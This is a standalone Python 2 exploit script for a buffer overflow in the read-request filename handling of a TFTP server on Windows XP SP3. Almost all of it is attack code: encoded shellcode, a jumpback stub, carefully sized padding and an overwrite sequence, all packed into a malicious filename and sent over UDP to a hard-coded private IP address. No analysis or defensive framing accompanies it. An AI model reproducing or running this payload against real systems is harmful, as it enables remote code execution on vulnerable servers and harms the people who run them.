#!/usr/bin/python
# TFTP SERVER V1.4 ST (RRQ Overflow)
# OS: Windows XP PRO SP3
import socket
import sys

hostname = "192.168.99.131"
port = 69

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
    print "error"
    sys.exit(1)

mode = "netasciii"

# Payload size: 351 bytes
shellcode = ""
shellcode += "\xba\x9a\x65\x92\xbe\xdb\xcd\xd9\x74\x24\xf4\x5e\x31"
shellcode += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xcc\x6b\x70"
shellcode += "\x4b\x0c\x9b\xf6\xb4\xec\x5c\x97\x3d\x09\x6d\x97\x5a"
shellcode += "\x5a\xde\x27\x28\x0e\xd3\xcc\x7c\xba\x60\xa0\xa8\xcd"
shellcode += "\xc1\x0f\x8f\xe0\xd2\x3c\xf3\x63\x51\x3f\x20\x43\x68"
shellcode += "\xf0\x35\x82\xad\xed\xb4\xd6\x66\x79\x6a\xc6\x03\x37"
shellcode += "\xb7\x6d\x5f\xd9\xbf\x92\x28\xd8\xee\x05\x22\x83\x30"
shellcode += "\xa4\xe7\xbf\x78\xbe\xe4\xfa\x33\x35\xde\x71\xc2\x9f"
shellcode += "\x2e\x79\x69\xde\x9e\x88\x73\x27\x18\x73\x06\x51\x5a"
shellcode += "\x0e\x11\xa6\x20\xd4\x94\x3c\x82\x9f\x0f\x98\x32\x73"
shellcode += "\xc9\x6b\x38\x38\x9d\x33\x5d\xbf\x72\x48\x59\x34\x75"
shellcode += "\x9e\xeb\x0e\x52\x3a\xb7\xd5\xfb\x1b\x1d\xbb\x04\x7b"
shellcode += "\xfe\x64\xa1\xf0\x13\x70\xd8\x5b\x7c\xb5\xd1\x63\x7c"
shellcode += "\xd1\x62\x10\x4e\x7e\xd9\xbe\xe2\xf7\xc7\x39\x04\x22"
shellcode += "\xbf\xd5\xfb\xcd\xc0\xfc\x3f\x99\x90\x96\x96\xa2\x7a"
shellcode += "\x66\x16\x77\x2c\x36\xb8\x28\x8d\xe6\x78\x99\x65\xec"
shellcode += "\x76\xc6\x96\x0f\x5d\x6f\x3c\xea\x36\x50\x69\x97\x4b"
shellcode += "\x38\x68\x57\x55\x02\xe5\xb1\x3f\x64\xa0\x6a\xa8\x1d"
shellcode += "\xe9\xe0\x49\xe1\x27\x8d\x4a\x69\xc4\x72\x04\x9a\xa1"
shellcode += "\x60\xf1\x6a\xfc\xda\x54\x74\x2a\x72\x3a\xe7\xb1\x82"
shellcode += "\x35\x14\x6e\xd5\x12\xea\x67\xb3\x8e\x55\xde\xa1\x52"
shellcode += "\x03\x19\x61\x89\xf0\xa4\x68\x5c\x4c\x83\x7a\x98\x4d"
shellcode += "\x8f\x2e\x74\x18\x59\x98\x32\xf2\x2b\x72\xed\xa9\xe5"
shellcode += "\x12\x68\x82\x35\x64\x75\xcf\xc3\x88\xc4\xa6\x95\xb7"
shellcode += "\xe9\x2e\x12\xc0\x17\xcf\xdd\x1b\x9c\xff\x97\x01\xb5"
shellcode += "\x97\x71\xd0\x87\xf5\x81\x0f\xcb\x03\x02\xa5\xb4\xf7"
shellcode += "\x1a\xcc\xb1\xbc\x9c\x3d\xc8\xad\x48\x41\x7f\xcd\x58"

jumpback = "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1"

filename = "A" * (1212 - 4 - 128 - 391) + "\x90" * (391 - len(shellcode)) + shellcode + \
    "B" * 82 + "\x90" * (46 - len(jumpback)) + jumpback + "\xeb\xd0\x90\x90" + "\x05\x95\x40"
shellcodefer = "\x00\x02" + filename + "\0" + mode + "\0"
s.sendto(shellcodefer, (hostname, port))
